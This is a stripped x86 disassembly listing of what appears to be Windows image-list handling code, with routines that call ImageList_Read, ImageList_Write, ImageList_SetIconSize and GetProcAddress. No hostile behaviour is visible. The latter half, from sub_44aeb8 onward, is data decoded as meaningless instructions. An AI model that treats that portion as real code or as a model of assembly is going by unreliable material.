retn
mov eax esi
call sub_449c3c
mov edx eax
or ecx 0xffffffff
mov eax ebx
call sub_44a1a8
sub_44a370
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
mov eax ebx
call sub_449ca0
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_416dc8
mov eax ebx
call sub_449ef4
movzx eax [ esi + 0x41 ]
mov [ ebx + 0x41 ] al
movzx eax [ esi + 0x43 ]
mov [ ebx + 0x43 ] al
movzx edx [ esi + 0x40 ]
mov eax ebx
call sub_44a560
movzx eax [ esi + 0x42 ]
mov [ ebx + 0x42 ] al
mov eax esi
call sub_449c3c
mov edx eax
mov eax ebx
call sub_449bd8
mov eax ebx
call sub_449b00
test al al
jne r-xdata
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax ebx
call sub_449c3c
push eax
call ImageList_SetIconSize
mov eax ebx
call sub_449b08
jmp r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_449c3c
push eax
call ImageList_GetBkColor
call sub_449970
mov edx eax
mov eax ebx
call sub_449f00
mov eax [ esi + 0x48 ]
mov [ ebx + 0x48 ] eax
mov edx esi
mov eax ebx
call sub_44a350
jmp r-xdata
sub_44a434
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_416eac
pop esi
pop ebx
retn
movzx eax [ esi + 0x41 ]
mov [ ebx + 0x41 ] al
movzx eax [ esi + 0x43 ]
mov [ ebx + 0x43 ] al
movzx edx [ esi + 0x40 ]
mov eax ebx
call sub_44a560
movzx eax [ esi + 0x42 ]
mov [ ebx + 0x42 ] al
mov eax [ esi + 0x48 ]
mov [ ebx + 0x48 ] eax
mov eax ebx
call sub_449ef4
mov eax esi
call sub_449c3c
mov edx eax
mov eax ebx
call sub_449bd8
mov eax ebx
call sub_449b00
test al al
jne r-xdata
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax ebx
call sub_449c3c
push eax
call ImageList_SetIconSize
mov eax ebx
call sub_449b08
jmp r-xdata
mov eax esi
call sub_449c3c
push eax
call ImageList_GetBkColor
call sub_449970
mov edx eax
mov eax ebx
call sub_449f00
mov edx esi
mov eax ebx
call sub_44a350
pop esi
pop ebx
retn
sub_44a4e8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44a554
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44a55b
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
cmp eax [ ebx + 0x30 ]
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbb4
call sub_4047d8
mov eax esi
mov edx [ eax ]
call [ edx + 0x2c ]
cmp eax [ ebx + 0x34 ]
jge r-xdata
sub_44a588
push ebx
push esi
push edi
push ebp
mov ebx eax
mov [ ebx + 0x58 ] 0x1
cmp [ ebx + 0x5c ] 0x0
jg r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x4c ]
test eax eax
je r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
inc edi
xor ebp ebp
mov edx ebp
mov eax [ ebx + 0x4c ]
call sub_4167c8
mov si 0xffff
call sub_404160
inc ebp
dec edi
jne r-xdata
sub_44a5d8
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov eax [ ebx + 0x4c ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
xor eax eax
mov [ ebp + 0x4 ] eax
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_4166b4
jmp r-xdata
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_4167c8
cmp ebp eax
jne r-xdata
sub_44a630
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ esi + 0x4 ]
mov eax [ ebx + 0x4 ]
call sub_4091b0
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_44a674
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi edx
mov esi eax
test edi edi
je r-xdata
mov [ ebp - 0x1 ] 0x0
jmp r-xdata
mov eax esi
call sub_449e44
mov ebx eax
mov eax edi
call sub_449e44
cmp ebx eax
je r-xdata
movzx eax [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax esi
call sub_449e44
test eax eax
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_44a750
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44a733
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_44a630
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44a73a
mov eax [ ebp - 0xc ]
call sub_403f64
retn
mov eax edi
call sub_449e44
test eax eax
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
sub_44a764
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_449e44
test eax eax
setg al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_44a674
test al al
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn
sub_44a7c0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_41ddec
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x3c ]
push eax
push ebp
call sub_44a764
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44a818
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x18 ]
mov ecx 0x4
mov eax ebx
call sub_4194ec
lea edx [ ebp - 0x1c ]
mov ecx 0x4
mov eax ebx
call sub_4194ec
mov dl 0x1
mov eax [ r-xdata ]
call sub_42830c
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_44aa9c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4192c0
mov esi eax
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov eax [ ebp - 0x18 ]
add eax esi
cdq
push edx
push eax
mov eax ebx
call sub_4192e0
mov dl 0x1
mov eax [ r-xdata ]
call sub_42830c
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44aa7f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42830c
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42830c
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ ebp - 0x14 ]
call sub_429710
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
xor edx edx
xor eax eax
call sub_415370
mov eax [ ebp - 0x4 ]
call sub_44ae44
xor eax eax
push ebp
push sub_44aa62
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x30 ]
cdq
idiv ecx
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44aa69
mov eax [ ebp - 0xc ]
call sub_403f64
mov eax [ ebp - 0x14 ]
call sub_403f64
mov eax [ ebp - 0x4 ]
call sub_44ae48
retn
inc eax
mov [ ebp - 0x20 ] eax
xor edi edi
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x34 ]
cdq
idiv ecx
mov esi eax
dec esi
test esi esi
jl r-xdata
inc edi
dec [ ebp - 0x20 ]
jne r-xdata
inc esi
xor ebx ebx
cmp [ ebp - 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
imul edx edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
imul eax ebx
call sub_415398
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_4288e0
push eax
mov eax [ ebp - 0xc ]
call sub_4288e0
lea edx [ ebp - 0x30 ]
pop ecx
call sub_424138
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
imul edx edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
imul eax ebx
call sub_415398
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_4288e0
push eax
mov eax [ ebp - 0x14 ]
call sub_4288e0
lea edx [ ebp - 0x30 ]
pop ecx
call sub_424138
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_449d78
dec [ ebp - 0x1c ]
inc ebx
dec esi
jne r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_44aaac
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41e578
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44ab0c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
push eax
call ImageList_Read
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_449c10
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ab13
mov eax [ ebp - 0xc ]
call sub_403f64
retn
sub eax 0xffffffec
sub_44ab13
mov eax [ ebp - 0x4 ]
call sub_449b00
test al al
jne r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor ebx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44ac43
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
call sub_4192e0
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_419a08
push 0x0
push 0x12
mov eax [ ebp - 0x10 ]
call sub_4192e0
lea edx [ ebp - 0x11 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov esi [ eax ]
call [ esi + 0xc ]
dec eax
jne r-xdata
test bl bl
je r-xdata
cmp [ ebp - 0x11 ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_403f64
retn
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
call sub_4192e0
push 0x0
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41e578
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44ac26
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
push 0x0
push 0x38
mov eax [ ebp - 0x10 ]
call sub_4192e0
lea edx [ ebp - 0x12 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov esi [ eax ]
call [ esi + 0xc ]
dec eax
jne r-xdata
push eax
call ImageList_Read
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_449c10
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403f64
retn
sub eax 0xffffffec
movzx eax [ ebp - 0x12 ]
or [ ebp - 0x11 ] al
push 0x0
push 0x12
mov eax [ ebp - 0x10 ]
call sub_4192e0
lea edx [ ebp - 0x11 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
dec eax
sete bl
sub_44ac74
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov esi eax
mov eax esi
call sub_449ca0
mov eax edi
call sub_4192c0
mov [ esp + 0xc ] eax
mov edx esp
mov ecx 0x4
mov eax edi
mov ebx [ eax ]
call [ ebx + 0xc ]
lea edx [ esp + 0x4 ]
mov ecx 0x4
mov eax edi
mov ebx [ eax ]
call [ ebx + 0xc ]
movzx ebx [ esp ]
and bl 0xff
movzx eax [ esp ]
shr ax 0x8
mov [ esp + 0x8 ] al
mov eax [ esp + 0xc ]
cdq
push edx
push eax
mov eax edi
call sub_4192e0
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov edx edi
mov eax esi
call sub_44a818
cmp bl 0x49
jne r-xdata
cmp [ esp + 0x8 ] 0x4c
jne r-xdata
mov edx edi
mov eax esi
call sub_44aaac
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_44ad00
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_41e578
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44adfa
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov eax r-xdata
call sub_40e3fc
mov [ rw-data ] eax
cmp [ rw-data ] 0x60000
jb r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
push r-xdata
call GetModuleHandleA
mov edi eax
test edi edi
je r-xdata
push eax
mov eax ebx
call sub_449c3c
push eax
call ImageList_Write
test eax eax
jne r-xdata
sub eax 0xffffffec
push eax
push 0x1
mov eax ebx
call sub_449c3c
push eax
call [ rw-data ]
test eax eax
je r-xdata
sub eax 0xffffffec
push r-xdata
push edi
call GetProcAddress
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ae01
mov eax [ ebp - 0x4 ]
call sub_403f64
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dc70
call sub_4047d8
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dc70
call sub_4047d8
jmp r-xdata
sub_44ae68
push ebx
push esi
call sub_404330
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403f54
test bl bl
jle r-xdata
mov edx esi
call sub_44a5d8
pop esi
pop ebx
retn
mov eax esi
call sub_4042d8
sub_44aeb8
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec eax
scasd [ edi ]
inc esp
add [ edi + ebp * 4 + 0x44 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop edx
scasd [ edi ]
inc esp
add [ edi + ebp * 4 + 0x44 ] dh
add [ eax ] ah
add [ eax ] al
push eax
push edx
inc ecx
add al ch
loope r-xdata
fcomp st6
inc ecx
add [ eax ] cl
loop r-xdata
add [ eax + 0x24004041 ] bh
fild [ ecx ]
rol [ ecx + 0x40 ] 0x0
mov ah 0x41
inc eax
add ah bh
inc eax
add [ eax ] bl
aas
inc eax
add [ ebx + esi * 4 + 0x6eac0044 ] ch
inc ecx
add ah ch
fld [ ecx ]
enter 0x416d 0x0
cld
mov bl 0x44
add [ esp + esi * 4 ] cl
inc esp
add [ eax ] dl
push esp
inc ebx
outsd
outsb
je sub_44afdc
add [ eax - 0x13ffbe1d ] al
in al 0x41
add [ eax + 0x240041e4 ] dl
in al 0x41
add [ esp + 0x41 ] dl
add [ eax ] ch
in al 0x41
add [ eax - 0x4b ] dh
inc esp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + 0x58004010 ] dh
add [ eax ] al
add [ eax + eax ] al
clc
imul ebp [ esi + 0x65 ] 0x74634164
imul ebp [ edi + 0x6e ] 0x8c00408d
scasd [ edi ]
inc esp
add [ edi ] al
adc [ ebx + eax * 2 + 0x6f ] dl
outsb
je r-xdata
mov al 0x44
imul ebp [ esi + 0x65 ] 0x74634164
imul ebp [ edi + 0x6e ] r-xdata
cld
push edx
inc ecx
add [ ebx ] al
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0x10b00001
inc eax
add [ eax ] bl
add bh bh
cwde
mov ah 0x44
add al bh
mov bl 0x44
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43080002 ] al
popad
je r-xdata
inc esp
inc ecx
add al ch
loope r-xdata
add ah dl
fiadd [ ecx ]
int3
outsd
jb r-xdata
fcomp st6
inc ecx
add [ eax ] cl
loop r-xdata
add [ eax + 0x24004041 ] bh
fild [ ecx ]
rol [ ecx + 0x40 ] 0x0
mov ah 0x41
inc eax
add ah bh
inc eax
add [ eax ] bl
aas
inc eax
add [ esi + esi * 4 ] dh
inc esp
add [ esi + ebp * 2 - 0x2213ffbf ] ch
inc ecx
add al cl
insd
inc ecx
add ah al
fiadd [ ecx ]
pop eax
mov bh 0x44
add ah bl
mov bh 0x44
add [ eax ] bl
mov bh 0x44
add [ eax ] ch
mov ecx 0x40044
std
add al cl
mov ch 0x44
add [ edx - 0x50 ] bh
inc esp
add [ eax ] ch
add [ eax ] al
jo r-xdata
mov eax eax
and al 0xb0
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x44b0 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x50 ] ah
inc esp
pop es
adc [ ebx + eax * 2 + 0x75 ] edx
jae r-xdata
add [ ecx + edi * 2 + 0x41 ] bh
add [ esi + ecx * 4 - 0x712fffbf ] bl
inc ecx
add ah dl
mov es [ ecx ]
fmul [ esi + 0x7e680041 ]
inc ecx
add [ eax - 0x70 ] dl
inc ecx
add [ eax + edx * 4 - 0x6e7fffbf ] ch
inc ecx
add ah dh
test [ ecx ] eax
mov esp 0x3c004191
xchg edx eax
inc ecx
add [ eax - 0x3f ] cl
inc esp
add [ eax - 0x74 ] dl
inc ecx
add ah al
js r-xdata
outsd
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
insb
push ecx
inc ecx
add [ edx ] al
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0xb1040000
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x44b1 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + esi * 4 + 0x380044 ] bl
add [ eax ] al
pop esp
inc edi
inc ecx
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add ah ah
mov eax [ ecx ]
lodsb [ esi ]
outsb
inc ecx
add [ edx + edi * 2 + 0x797c0041 ] ah
inc ecx
ror [ ecx + eax * 2 + 0x418fd400 ] 0x1
add ah ch
mov [ ecx ] es
sub al 0x8d
inc ecx
add [ eax + 0x1400418d ] bl
jle r-xdata
add al 0x92
inc ecx
add [ 0x6f685354 ] cl
jb r-xdata
add [ eax ] bl
mov es [ ecx ]
hlt
add [ edi + ecx * 4 ] dh
inc ecx
add ah al
add [ ecx ] 0x98
add [ ecx ] sub_418f70
or [ edi - 0x7e03ffbf ] 0x41
add [ eax - 0x7e ] dl
inc ecx
add ah bh
add [ ecx ] 0x90
test [ ecx ] al
call 0xffffffffa444f305
test [ ecx ] eax
mov ah 0x8c
inc ecx
add al dl
mov [ ecx ] es
aam 0x8f
inc ecx
add [ eax ] bl
aas
inc ebx
jne r-xdata
inc eax
add [ eax ] bl
mov ebx 0xbb680044
inc esp
add ah ch
fld [ ecx ]
enter 0x416d 0x0
dec esp
imul esi [ ebx + 0x74 ] 0xb1b0c08b
inc esp
add [ edi ] al
or eax 0x6f685354
jb r-xdata
inc ebx
jne r-xdata
add [ esp ] ch
inc ecx
add [ esp + esi * 4 ] bl
inc esp
add [ eax + eax * 8 ] bh
inc esp
add [ eax ] al
loop r-xdata
dec esp
imul esi [ ebx + 0x74 ] r-xdata
dec esp
dec eax
inc ecx
add [ eax ] al
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0xb2200000
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + esi * 4 + 0x44 ] dh
add [ eax + 0x44b2 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi - 0x5bffbb4e ] dl
mov dl 0x44
add [ eax - 0x4c000000 ] ah
scasb [ edi ]
inc esp
add al ch
loope r-xdata
inc eax
add [ eax + eax ] ah
add ah ah
fiadd [ ecx ]
fcomp st6
inc ecx
add [ eax ] cl
loop r-xdata
add [ eax + 0x24004041 ] bh
fild [ ecx ]
rol [ ecx + 0x40 ] 0x0
mov ah 0x41
inc eax
add ah bh
inc eax
add [ edx ] al
add dh ch
add [ eax ] al
mov al 0x10
inc eax
add [ eax + eax ] bh
add [ eax + 0x78004010 ] dh
add [ eax ] al
add [ eax + 0x7c004010 ] dh
add [ eax ] al
add ah al
mov edx 0xe4ec0044
inc ecx
add [ eax + 0x240041e4 ] dl
in al 0x41
add [ esp + 0x41 ] dl
add [ eax ] ch
in al 0x41
add [ eax - 0x4b ] dh
inc esp
add [ esi + edi * 4 + 0x44 ] ah
add ah bh
mov ebp 0xc13c0044
inc esp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + 0x64004010 ] dh
add [ eax ] al
sub_44afdc
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
mov al 0x44
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x50 ] ah
inc esp
add [ edx - 0x50 ] bh
inc esp
add [ eax ] ch
add [ eax ] al
jo r-xdata
inc esp
inc ecx
add al ch
loope r-xdata
fcomp st6
inc ecx
add [ eax ] cl
loop r-xdata
add [ eax + 0x24004041 ] bh
fild [ ecx ]
rol [ ecx + 0x40 ] 0x0
mov ah 0x41
inc eax
add ah bh
inc eax
add [ eax ] bl
aas
inc eax
add [ esi + esi * 4 ] dh
inc esp
add [ esi + ebp * 2 - 0x2213ffbf ] ch
inc ecx
add al cl
insd
inc ecx
add ah al
fiadd [ ecx ]
pop eax
mov bh 0x44
add ah dl
fiadd [ ecx ]
int3
pop es
adc [ ebx + eax * 2 + 0x75 ] edx
jae r-xdata
add ah bl
mov bh 0x44
add [ eax ] bl
mov bh 0x44
add [ eax ] ch
mov ecx 0x40044
std
add al cl
mov ch 0x44
add [ ecx + edi * 2 + 0x41 ] bh
add [ esi + ecx * 4 - 0x712fffbf ] bl
inc ecx
add ah dl
mov es [ ecx ]
fmul [ esi + 0x7e680041 ]
inc ecx
add [ eax - 0x70 ] dl
inc ecx
add [ eax + edx * 4 - 0x6e7fffbf ] ch
inc ecx
add ah dh
test [ ecx ] eax
mov esp 0x3c004191
xchg edx eax
inc ecx
add [ eax - 0x3f ] cl
inc esp
add [ eax - 0x74 ] dl
inc ecx
add ah al
js r-xdata
outsd
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
insb
push ecx
inc ecx
add [ edx ] al
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0xb1040000
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x44b1 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + esi * 4 + 0x380044 ] bl
add [ eax ] al
pop esp
inc edi
inc ecx
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add ah ah
mov eax [ ecx ]
lodsb [ esi ]
outsb
inc ecx
add [ edx + edi * 2 + 0x797c0041 ] ah
inc ecx
ror [ ecx + eax * 2 + 0x418fd400 ] 0x1
add ah ch
mov [ ecx ] es
sub al 0x8d
inc ecx
add [ eax + 0x1400418d ] bl
jle r-xdata
add al 0x92
inc ecx
add [ 0x6f685354 ] cl
jb r-xdata
add [ eax ] bl
mov es [ ecx ]
hlt
add [ edi + ecx * 4 ] dh
inc ecx
add ah al
add [ ecx ] 0x98
add [ ecx ] sub_418f70
or [ edi - 0x7e03ffbf ] 0x41
add [ eax - 0x7e ] dl
inc ecx
add ah bh
add [ ecx ] 0x90
test [ ecx ] al
call 0xffffffffa444f305
test [ ecx ] eax
mov ah 0x8c
inc ecx
add al dl
mov [ ecx ] es
aam 0x8f
inc ecx
add [ eax ] bl
aas
inc ebx
jne r-xdata
inc eax
add [ eax ] bl
mov ebx 0xbb680044
inc esp
add ah ch
fld [ ecx ]
enter 0x416d 0x0
dec esp
imul esi [ ebx + 0x74 ] 0xb1b0c08b
inc esp
add [ edi ] al
or eax 0x6f685354
jb r-xdata
inc ebx
jne r-xdata
add [ esp ] ch
inc ecx
add [ esp + esi * 4 ] bl
inc esp
add [ eax + eax * 8 ] bh
inc esp
add [ eax ] al
loop r-xdata
dec esp
imul esi [ ebx + 0x74 ] r-xdata
dec esp
dec eax
inc ecx
add [ eax ] al
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0xb2200000
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + esi * 4 + 0x44 ] dh
add [ eax + 0x44b2 ] bh
add [ eax ] al
